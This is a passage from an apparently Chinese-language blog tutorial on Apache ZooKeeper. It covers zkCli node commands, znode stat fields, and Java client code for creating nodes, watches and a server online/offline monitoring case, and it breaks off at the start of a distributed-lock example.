class="code"><pre><span class="line"><span class="comment"># 增加脚本执行权限</span></span><br><span class="line">chmod u+x zk.sh</span><br><span class="line">zk.sh start</span><br><span class="line">zk.sh stop</span><br></pre></td></tr></table></figure><h1>三、ZK客户端相关操作</h1><h2 id="1、客户端命令行操作">1、客户端命令行操作</h2><h3 id="1-1-命令行语法">1.1 命令行语法</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 启动客户端</span></span><br><span class="line">bin/zkCli.sh -server hadoop102:2181</span><br><span class="line"><span class="comment"># 显示所有操作命令</span></span><br><span class="line"><span class="built_in">help</span></span><br></pre></td></tr></table></figure><table><thead><tr><th><strong>命令基本语法</strong></th><th><strong>功能描述</strong></th></tr></thead><tbody><tr><td>help</td><td>显示所有操作命令</td></tr><tr><td>ls path</td><td>使用 ls 命令来查看当前 znode 的子节点 [可监听]-w 监听子节点变化-s 附加次级信息</td></tr><tr><td>create</td><td>普通创建-s 含有序列-e 临时（重启或者超时消失）</td></tr><tr><td>get path</td><td>获得节点的值 [可监听]-w 监听节点内容变化-s 附加次级信息</td></tr><tr><td>set</td><td>设置节点的具体值</td></tr><tr><td>stat</td><td>查看节点状态</td></tr><tr><td>delete</td><td>删除节点</td></tr><tr><td>deleteall</td><td>递归删除节点</td></tr></tbody></table><h3 id="1-2-znode-节点数据信息">1.2 znode 节点数据信息</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查看当前znode中所包含的内容</span></span><br><span class="line">ls / </span><br><span class="line"><span class="comment"># 查看当前节点详细数据</span></span><br><span class="line">ls -s /</span><br></pre></td></tr></table></figure><ul><li><strong>czxid：创建节点的事务 zxid</strong>。每次修改ZooKeeper 状态都会产生一个ZooKeeper 事务 ID。事务 ID 是ZooKeeper 中所有修改总的次序。每次修改都有唯一的 zxid，如果 zxid1 小于 zxid2，那么zxid1 在 zxid2 之前发生。</li><li>ctime：znode 被创建的毫秒数（从 1970 年开始）</li><li>mzxid：znode 最后更新的事务zxid</li><li>mtime：znode 最后修改的毫秒数（从 1970 年开始）</li><li>pZxid：znode 最后更新的子节点zxid</li><li>cversion：znode 子节点变化号，znode 子节点修改次数</li><li><strong>dataversion：znode 数据变化号</strong></li><li>aclVersion：znode 访问控制列表的变化号</li><li>ephemeralOwner：如果是临时节点，这个是 znode 拥有者的 session id。如果不是临时节点则是 0</li><li>dataLength：znode 的数据长度</li><li>numChildren：znode 子节点数量</li></ul><h3 id="1-3-节点类型-持久-短暂-有序号-无序号">1.3 节点类型(持久/短暂/有序号/无序号)</h3><p><img src="http://qnypic.shawncoding.top/blog/202402291817888.png" alt></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 分别创建2个普通节点（永久节点 + 不带序号）</span></span><br><span class="line"><span class="comment"># 注意：创建节点时，要赋值</span></span><br><span class="line">create /sanguo <span class="string">"diaochan"</span></span><br><span class="line">create /sanguo/shuguo <span class="string">"liubei"</span></span><br><span class="line"><span class="comment"># 获得节点的值</span></span><br><span class="line">get -s /sanguo</span><br><span class="line">get -s /sanguo/shuguo</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建带序号的节点（永久节点 + 带序号）</span></span><br><span class="line"><span class="comment"># 先创建一个普通的根节点/sanguo/weiguo</span></span><br><span class="line">create /sanguo/weiguo <span class="string">"caocao"</span></span><br><span class="line"><span class="comment"># 创建带序号的节点</span></span><br><span class="line">create -s /sanguo/weiguo/zhangliao <span class="string">"zhangliao"</span></span><br><span class="line"><span class="comment"># 重复编号会增加</span></span><br><span class="line">create -s /sanguo/weiguo/zhangliao <span class="string">"zhangliao"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建短暂节点（短暂节点 + 不带序号 or 带序号）</span></span><br><span class="line"><span class="comment"># 创建短暂的不带序号的节点</span></span><br><span class="line">create -e /sanguo/wuguo <span class="string">"zhouyu"</span></span><br><span class="line"><span class="comment"># 创建短暂的带序号的节点</span></span><br><span class="line">create -e -s /sanguo/wuguo <span class="string">"zhouyu"</span></span><br><span class="line"><span class="comment"># 在当前客户端是能查看到的</span></span><br><span class="line">ls /sanguo</span><br><span class="line"><span class="comment"># 退出当前客户端然后再重启客户端</span></span><br><span class="line">quit</span><br><span class="line">bin/zkCli.sh</span><br><span class="line"><span class="comment"># 再次查看根目录下短暂节点已经删除</span></span><br><span class="line">ls /sanguo</span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改节点数据值</span></span><br><span class="line"><span class="built_in">set</span> /sanguo/weiguo <span class="string">"simayi"</span></span><br></pre></td></tr></table></figure><h3 id="1-4-节点删除与查看">1.4 节点删除与查看</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 删除节点</span></span><br><span class="line">delete /sanguo/jin</span><br><span class="line"><span class="comment"># 递归删除节点</span></span><br><span class="line">deleteall /sanguo/shuguo</span><br><span class="line"><span class="comment"># 查看节点状态</span></span><br><span class="line"><span class="built_in">stat</span> /sanguo</span><br></pre></td></tr></table></figure><h2 id="2、监听器原理">2、监听器原理</h2><blockquote><p>客户端注册监听它关心的目录节点，当目录节点发生变化（数据改变、节点删除、子目录节点增加删除）时，ZooKeeper 会通知客户端。监听机制保证 ZooKeeper 保存的任何的数据的任何改变都能快速的响应到监听了该节点的应用程序</p></blockquote><p><img src="http://qnypic.shawncoding.top/blog/202402291817889.png" alt></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 节点的值变化监听</span></span><br><span class="line"><span class="comment"># 在 hadoop104 主机上注册监听/sanguo 节点数据变化</span></span><br><span class="line">get -w /sanguo</span><br><span class="line"><span class="comment"># 在 hadoop103 主机上修改/sanguo 节点的数据</span></span><br><span class="line"><span class="comment"># 观察 hadoop104 主机收到数据变化的监听</span></span><br><span class="line"><span class="built_in">set</span> /sanguo <span class="string">"xisi"</span></span><br><span class="line"><span class="comment"># 注意：在hadoop103再多次修改/sanguo的值，hadoop104上不会再收到监听。因为注册一次，只能监听一次。想再次监听，需要再次注册</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 节点的子节点变化监听（路径变化）</span></span><br><span class="line"><span class="comment"># 在 hadoop104 主机上注册监听/sanguo 节点的子节点变化</span></span><br><span class="line">ls -w /sanguo</span><br><span class="line"><span class="comment"># 在 hadoop103 主机/sanguo 节点上创建子节点</span></span><br><span class="line"><span class="comment"># create /sanguo/jin "simayi"</span></span><br><span class="line">create /sanguo/jin <span class="string">"simayi"</span></span><br></pre></td></tr></table></figure><h2 id="3、客户端-API-操作">3、客户端 API 操作</h2><blockquote><p>前提：保证 hadoop102、hadoop103、hadoop104 服务器上 Zookeeper 集群服务端启动</p></blockquote><p>创建zookeeper工程，引入对应依赖</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.logging.log4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>log4j-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.8.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.zookeeper<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>zookeeper<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.5.7<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>需要在项目的 src/main/resources 目录下，新建一个文件，命名为&quot;log4j.properties&quot;，填入数据</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">log4j.rootLogger&#x3D;INFO, stdout  </span><br><span class="line">log4j.appender.stdout&#x3D;org.apache.log4j.ConsoleAppender  </span><br><span class="line">log4j.appender.stdout.layout&#x3D;org.apache.log4j.PatternLayout  </span><br><span class="line">log4j.appender.stdout.layout.ConversionPattern&#x3D;%d %p [%c] - %m%n  </span><br><span class="line">log4j.appender.logfile&#x3D;org.apache.log4j.FileAppender  </span><br><span class="line">log4j.appender.logfile.File&#x3D;target&#x2F;spring.log  </span><br><span class="line">log4j.appender.logfile.layout&#x3D;org.apache.log4j.PatternLayout  </span><br><span class="line">log4j.appender.logfile.layout.ConversionPattern&#x3D;%d %p [%c] - %m%n</span><br></pre></td></tr></table></figure><p>创建包名com.atguigu.zk，创建类名称zkClient</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">zkClient</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 注意：逗号左右不能有空格</span></span><br><span class="line">    <span class="keyword">private</span> String connectString = <span class="string">"hadoop102:2181,hadoop103:2181,hadoop104:2181"</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> sessionTimeout = <span class="number">2000</span>;</span><br><span class="line">    <span class="keyword">private</span> ZooKeeper zkClient;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//创建 ZooKeeper 客户端</span></span><br><span class="line">    <span class="meta">@Before</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line"></span><br><span class="line">        zkClient = <span class="keyword">new</span> ZooKeeper(connectString, sessionTimeout, <span class="keyword">new</span> Watcher() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">process</span><span class="params">(WatchedEvent watchedEvent)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">//                System.out.println("-------------------------------");</span></span><br><span class="line"><span class="comment">//                List&lt;String&gt; children = null;</span></span><br><span class="line"><span class="comment">//                try &#123;</span></span><br><span class="line"><span class="comment">//                    children = zkClient.getChildren("/", true);</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//                    for (String child : children) &#123;</span></span><br><span class="line"><span class="comment">//                        System.out.println(child);</span></span><br><span class="line"><span class="comment">//                    &#125;</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//                    System.out.println("-------------------------------");</span></span><br><span class="line"><span class="comment">//                &#125; catch (KeeperException e) &#123;</span></span><br><span class="line"><span class="comment">//                    e.printStackTrace();</span></span><br><span class="line"><span class="comment">//                &#125; catch (InterruptedException e) &#123;</span></span><br><span class="line"><span class="comment">//                    e.printStackTrace();</span></span><br><span class="line"><span class="comment">//                &#125;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//创建子节点</span></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">create</span><span class="params">()</span> <span class="keyword">throws</span> KeeperException, InterruptedException </span>&#123;</span><br><span class="line">        <span class="comment">// 参数 1：要创建的节点的路径； 参数 2：节点数据 ； 参数 3：节点权限 ；参数 4：节点的类型</span></span><br><span class="line">        String nodeCreated = zkClient.create(<span class="string">"/atguigu"</span>, <span class="string">"ss.avi"</span>.getBytes(), ZooDefs.Ids.OPEN_ACL_UNSAFE, CreateMode.PERSISTENT);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//获取子节点并监听节点变化</span></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">getChildren</span><span class="params">()</span> <span class="keyword">throws</span> KeeperException, InterruptedException </span>&#123;</span><br><span class="line">        List&lt;String&gt; children = zkClient.getChildren(<span class="string">"/"</span>, <span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (String child : children) &#123;</span><br><span class="line">            System.out.println(child);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 延时</span></span><br><span class="line">        Thread.sleep(Long.MAX_VALUE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">exist</span><span class="params">()</span> <span class="keyword">throws</span> KeeperException, InterruptedException </span>&#123;</span><br><span class="line">        <span class="comment">// 判断 Znode 是否存在</span></span><br><span class="line">        Stat stat = zkClient.exists(<span class="string">"/atguigu"</span>, <span class="keyword">false</span>);</span><br><span class="line">        System.out.println(stat==<span class="keyword">null</span>? <span class="string">"not exist "</span> : <span class="string">"exist"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="4、客户端向服务端写数据流程">4、客户端向服务端写数据流程</h2><p>写流程之写入请求直接发送给Leader节点(写完半数即可返回成功)</p><p><img src="http://qnypic.shawncoding.top/blog/202402291817890.png" alt></p><p>写流程之写入请求发送给follower节点</p><p><img src="http://qnypic.shawncoding.top/blog/202402291817891.png" alt></p><h1>四、ZK生产环境案例</h1><h2 id="1、服务器动态上下线监听案例">1、服务器动态上下线监听案例</h2><h3 id="1-1-需求分析">1.1 需求分析</h3><p>某分布式系统中，主节点可以有多台，可以动态上下线，任意一台客户端都能实时感知到主节点服务器的上下线。</p><p><img src="http://qnypic.shawncoding.top/blog/202402291817892.png" alt></p><h3 id="1-2-具体实现">1.2 具体实现</h3><p>首先在集群上创建/serves节点 <code>create /servers &quot;servers&quot;</code></p><p>在 Idea 中创建包名：com.atguigu.zkcase1，创建服务端DistributeServer</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DistributeServer</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String connectString = <span class="string">"hadoop102:2181,hadoop103:2181,hadoop104:2181"</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> sessionTimeout = <span class="number">2000</span>;</span><br><span class="line">    <span class="keyword">private</span> ZooKeeper zk;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, KeeperException, InterruptedException </span>&#123;</span><br><span class="line"></span><br><span class="line">        DistributeServer server = <span class="keyword">new</span> DistributeServer();</span><br><span class="line">        <span class="comment">// 1 获取zk连接</span></span><br><span class="line">        server.getConnect();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 2 注册服务器到zk集群</span></span><br><span class="line">        server.regist(args[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 3 启动业务逻辑（睡觉）</span></span><br><span class="line">        server.business();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">business</span><span class="params">()</span> <span class="keyword">throws</span> InterruptedException </span>&#123;</span><br><span class="line">        Thread.sleep(Long.MAX_VALUE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">regist</span><span class="params">(String hostname)</span> <span class="keyword">throws</span> KeeperException, InterruptedException </span>&#123;</span><br><span class="line">        String create = zk.create(<span class="string">"/servers/"</span>+hostname, hostname.getBytes(), ZooDefs.Ids.OPEN_ACL_UNSAFE, CreateMode.EPHEMERAL_SEQUENTIAL);</span><br><span class="line"></span><br><span class="line">        System.out.println(hostname +<span class="string">" is online"</span>) ;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">getConnect</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line"></span><br><span class="line">        zk = <span class="keyword">new</span> ZooKeeper(connectString, sessionTimeout, <span class="keyword">new</span> Watcher() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">process</span><span class="params">(WatchedEvent watchedEvent)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>创建客户端DistributeClient</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DistributeClient</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String connectString = <span class="string">"hadoop102:2181,hadoop103:2181,hadoop104:2181"</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> sessionTimeout = <span class="number">2000</span>;</span><br><span class="line">    <span class="keyword">private</span> ZooKeeper zk;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, KeeperException, InterruptedException </span>&#123;</span><br><span class="line">        DistributeClient client = <span class="keyword">new</span> DistributeClient();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 1 获取zk连接</span></span><br><span class="line">        client.getConnect();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 2 监听/servers下面子节点的增加和删除</span></span><br><span class="line">        client.getServerList();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 3 业务逻辑（睡觉）</span></span><br><span class="line">        client.business();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">business</span><span class="params">()</span> <span class="keyword">throws</span> InterruptedException </span>&#123;</span><br><span class="line">        Thread.sleep(Long.MAX_VALUE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">getServerList</span><span class="params">()</span> <span class="keyword">throws</span> KeeperException, InterruptedException </span>&#123;</span><br><span class="line">        List&lt;String&gt; children = zk.getChildren(<span class="string">"/servers"</span>, <span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">        ArrayList&lt;String&gt; servers = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (String child : children) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">byte</span>[] data = zk.getData(<span class="string">"/servers/"</span> + child, <span class="keyword">false</span>, <span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line">            servers.add(<span class="keyword">new</span> String(data));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 打印</span></span><br><span class="line">        System.out.println(servers);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">getConnect</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        zk = <span class="keyword">new</span> ZooKeeper(connectString, sessionTimeout, <span class="keyword">new</span> Watcher() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">process</span><span class="params">(WatchedEvent watchedEvent)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    getServerList();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (KeeperException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="1-3-测试与分析">1.3 测试与分析</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 首先启动客户端</span></span><br><span class="line"><span class="comment"># 然后可以进行命令行的测试</span></span><br><span class="line">create -e -s /servers/hadoop102 <span class="string">"hadoop102"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 最后启动服务端，这里需要进行设置，否则同一时刻只能启动一个</span></span><br><span class="line"><span class="comment"># 点击 Edit Configurations，在弹出的窗口中（Program arguments）输入想启动的主机，例如，hadoop102</span></span><br><span class="line"><span class="comment"># 然后进行启动注册</span></span><br></pre></td></tr></table></figure><h2 id="2、ZooKeeper-分布式锁案例">2、ZooKeeper 分布式锁案例</h2><h3 id="2-1-概述">2.1 概述</h3><blockquote><p>分布式锁的概念可以参考：<a href="https://blog.csdn.net/lemon_TT/article/details/127445833" target="_blank" rel="noopener" title="几种分布式锁详解">几种分布式锁详解</a></p></blockquote><p><img src="http://qnypic.shawncoding.top/blog/202402291817893.png" alt></p><h3 id="2-2-原生-Zookeeper-实现分布式锁案例">2.2 原生 Zookeeper 实现分布式锁案例</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span 